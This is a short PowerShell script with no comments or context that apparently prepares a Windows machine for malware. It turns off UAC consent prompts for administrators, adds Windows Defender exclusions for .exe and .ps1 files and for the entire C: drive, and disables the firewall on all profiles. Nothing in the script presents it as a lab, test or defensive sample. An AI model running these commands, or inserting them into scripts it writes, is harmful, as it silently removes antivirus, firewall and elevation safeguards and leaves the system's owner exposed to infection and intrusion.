Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
Add-MpPreference -ExclusionExtension "exe"
Add-MpPreference -ExclusionExtension ".exe"
Add-MpPreference -ExclusionExtension "ps1"
Add-MpPreference -ExclusionExtension ".ps1"
Add-MpPreference -ExclusionPath "C:"
Add-MpPreference -ExclusionPath "C:\"
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
